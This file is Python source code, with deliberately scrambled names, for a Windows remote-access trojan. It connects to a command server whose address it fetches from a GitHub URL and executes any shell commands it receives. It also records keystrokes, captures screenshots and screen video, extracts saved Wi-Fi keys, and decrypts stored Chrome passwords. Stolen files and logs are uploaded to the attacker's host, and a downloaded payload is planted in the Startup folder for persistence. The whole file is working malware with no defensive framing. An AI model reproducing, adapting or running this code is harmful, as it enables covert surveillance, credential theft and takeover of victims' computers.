import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
YzNVuaLsflgvurlMgxAUxW = ""
VggybrcuHKbRpsTt = ""
IVVBImPpwNWIcIrc = "16.12.24.2"
sebVMBjgSUZ = "!"
rMUagQjUOWWihJosdLR = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
RhgKyHNxwilVpeLd = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
QdFWAwyhRrKqbXqdxB = os.path.expanduser("~\\AppData\\Local\\")
def PjPijTPvIIcqkQPuAJF(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def oiVfZHCLvuRDWWe(s):
	ZVtvsluLoDY = s.recv(1024)
	if len(ZVtvsluLoDY)==0:
		return True
	rEsZkCzrmwQevMWJGe = ZVtvsluLoDY.decode("utf-8").replace("\n","")
	if not rEsZkCzrmwQevMWJGe.startswith(sebVMBjgSUZ):
		proc = subprocess.run(rEsZkCzrmwQevMWJGe, shell=True, capture_output=True)
		VRiNqxzXrVmgEhjHd = proc.stdout + proc.stderr
		s.send(VRiNqxzXrVmgEhjHd)
		return
	HADtxrFFGqpafuJTARhPxn = rEsZkCzrmwQevMWJGe.split(" ")[0][1:]
	args = " ".join(rEsZkCzrmwQevMWJGe.split()[1:]).split()
	if HADtxrFFGqpafuJTARhPxn == "download":
		IqhQwZBZqxXeyQk(s, rEsZkCzrmwQevMWJGe)
	elif HADtxrFFGqpafuJTARhPxn == "screenshot":
		rqRnTKUmU(s)
	elif HADtxrFFGqpafuJTARhPxn == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif HADtxrFFGqpafuJTARhPxn == "update":
		NPrcwtrUitDiLzoJtDs(s)
	elif HADtxrFFGqpafuJTARhPxn == "wifi":
		OJiRONBH(s)
	elif HADtxrFFGqpafuJTARhPxn == "screenrecord":
		enANItuteeBSycTrgTwI(s, args)
	elif HADtxrFFGqpafuJTARhPxn == "chrome":
		decryptPasswords(s)
def IqhQwZBZqxXeyQk(s, rEsZkCzrmwQevMWJGe):
	iqFwYnetmENmSUBnWTHU = rEsZkCzrmwQevMWJGe.replace(sebVMBjgSUZ+"download ","").split(",")
	VRiNqxzXrVmgEhjHds = ""
	for f in iqFwYnetmENmSUBnWTHU:
		VRiNqxzXrVmgEhjHds += lobWjYPGJzhQRkHldgRrf(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(VRiNqxzXrVmgEhjHds, "utf-8"))
def rqRnTKUmU(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	XeqblpgbfvadMHBepf = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(XeqblpgbfvadMHBepf)
	image.close()
	r = lobWjYPGJzhQRkHldgRrf(XeqblpgbfvadMHBepf, "api/sscap")
	os.remove(XeqblpgbfvadMHBepf)
	s.send(bytes(r,"utf-8"))
def enANItuteeBSycTrgTwI(s, args):
	rtRmLxshNvlbMTm = 15
	if not args == []:
		try: rtRmLxshNvlbMTm = int(args[0])
		except: pass
	MqtHnIU = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	CQigJqBYKgTrkSTVtowv = []
	fps = 11
	numFrames = rtRmLxshNvlbMTm * fps
	for _ in range(numFrames):
		CQigJqBYKgTrkSTVtowv.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(MqtHnIU, CQigJqBYKgTrkSTVtowv, fps=fps, quality=8)
	lobWjYPGJzhQRkHldgRrf(MqtHnIU, "api/screc")
def lobWjYPGJzhQRkHldgRrf(zFBkChkIhDgVHrEhuZc, cDhOFTQSQ, IlVwWobAOiAFzWPO=None):
	if not os.path.isfile(zFBkChkIhDgVHrEhuZc):
		return "[!] 404: "+zFBkChkIhDgVHrEhuZc+"\n"
	headers = {"user":os.getlogin()}
	if IlVwWobAOiAFzWPO is not None:
		headers = {**headers, **IlVwWobAOiAFzWPO}
	f = open(zFBkChkIhDgVHrEhuZc, "rb")
	requests.post("http://"+YzNVuaLsflgvurlMgxAUxW+":5555/"+cDhOFTQSQ,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def NPrcwtrUitDiLzoJtDs(s):
	h, p, v = vBNehqjIGKRampX(True)
	if (v != IVVBImPpwNWIcIrc):
		NimfJKyVgKvVxd(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def OJiRONBH(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	MnjdaLVYZuHQJf = ""
	for p in profiles:
		try: MnjdaLVYZuHQJf+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: MnjdaLVYZuHQJf+=f"    {p} - N/A\n"
	s.send(bytes(MnjdaLVYZuHQJf, "utf-8"))
def NimfJKyVgKvVxd(XKlxXnhtNWFbyNDwIfcvkm):
	keGWTpHNYHsVCYgbcpheEOd = os.path.basename(__file__)
	fileType = keGWTpHNYHsVCYgbcpheEOd.split(".")[-1]
	QWHBnSVHC = keGWTpHNYHsVCYgbcpheEOd.split(".")[0]+"."+XKlxXnhtNWFbyNDwIfcvkm+".pyw" if fileType.startswith("py") else ".exe"
	vvywZlrwlz = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), QWHBnSVHC)
	if not os.path.isfile(vvywZlrwlz):
		with open(vvywZlrwlz, "w+") as f:
			f.write(requests.get(RhgKyHNxwilVpeLd+"file."+ "pyw" if vvywZlrwlz.split(".")[-1].startswith("py") else "exe").text)
def vBNehqjIGKRampX(force=False):
	global YzNVuaLsflgvurlMgxAUxW, VggybrcuHKbRpsTt
	if force or YzNVuaLsflgvurlMgxAUxW == "" or VggybrcuHKbRpsTt == "":
		ZVtvsluLoDY = requests.get(rMUagQjUOWWihJosdLR).text.replace("\n","").split(":")
		YzNVuaLsflgvurlMgxAUxW = ZVtvsluLoDY[0].strip()
		VggybrcuHKbRpsTt = ZVtvsluLoDY[1].strip()
		XKlxXnhtNWFbyNDwIfcvkm = ZVtvsluLoDY[2].strip()
	return YzNVuaLsflgvurlMgxAUxW, VggybrcuHKbRpsTt, XKlxXnhtNWFbyNDwIfcvkm
def PJaWfyyTGxJHZQcikm():
	try:
		DapUBCfVFbwzMbHinzz = "settings.xpb"
		XPpTuqcTzLxaUgeHqWUSzG = sorted([file for file in os.listdir(QdFWAwyhRrKqbXqdxB) if os.path.isfile(QdFWAwyhRrKqbXqdxB+"\\"+file) and file.endswith(DapUBCfVFbwzMbHinzz.split(".")[-1])])
		if DapUBCfVFbwzMbHinzz in XPpTuqcTzLxaUgeHqWUSzG:
			XPpTuqcTzLxaUgeHqWUSzG.remove(DapUBCfVFbwzMbHinzz)
		IFZIksowaOtFzoMSuQR = os.path.join(QdFWAwyhRrKqbXqdxB,DapUBCfVFbwzMbHinzz)
		if len(XPpTuqcTzLxaUgeHqWUSzG) > 0:
			with open(IFZIksowaOtFzoMSuQR, "ab+") as f:
				for file in XPpTuqcTzLxaUgeHqWUSzG:
					temp = os.path.join(QdFWAwyhRrKqbXqdxB,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		lobWjYPGJzhQRkHldgRrf(IFZIksowaOtFzoMSuQR, "api/log")
		if os.path.isfile(IFZIksowaOtFzoMSuQR):
			os.remove(IFZIksowaOtFzoMSuQR)
	except:
		pass
def MsAGNQElLTIWdXqq():
	logging.basicConfig(filename=(QdFWAwyhRrKqbXqdxB+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def csCLezMgcRYrf(k):
		logging.info(str(k))
	k=Listener(on_press=csCLezMgcRYrf)
	FNSHcBemlAqzxBWEph = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in FNSHcBemlAqzxBWEph:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	os.system(f"copy \"{basePath}\\Default\\Login Data\" \"{local}\\db.db\"")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.system(f"del {local}\\db.db")
	ZVtvsluLoDY = "\n"
	for login in logins:
		ZVtvsluLoDY += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(ZVtvsluLoDY)
def ScnLfgpbjioFPQCNazFtFWC():
	h, p, v = vBNehqjIGKRampX()
	PJaWfyyTGxJHZQcikm()
	if IVVBImPpwNWIcIrc != v:
		NimfJKyVgKvVxd(v)
	MsAGNQElLTIWdXqq()
	JTjFrtAzocKmsraUkpKbDgq = bytes(("(old)"if IVVBImPpwNWIcIrc!=v else "")+"["+IVVBImPpwNWIcIrc+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				lzimsYuNZ=False
				try:
					s=PjPijTPvIIcqkQPuAJF(h, p)
					while not lzimsYuNZ:
						s.send(JTjFrtAzocKmsraUkpKbDgq)
						lzimsYuNZ=oiVfZHCLvuRDWWe(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ScnLfgpbjioFPQCNazFtFWC()
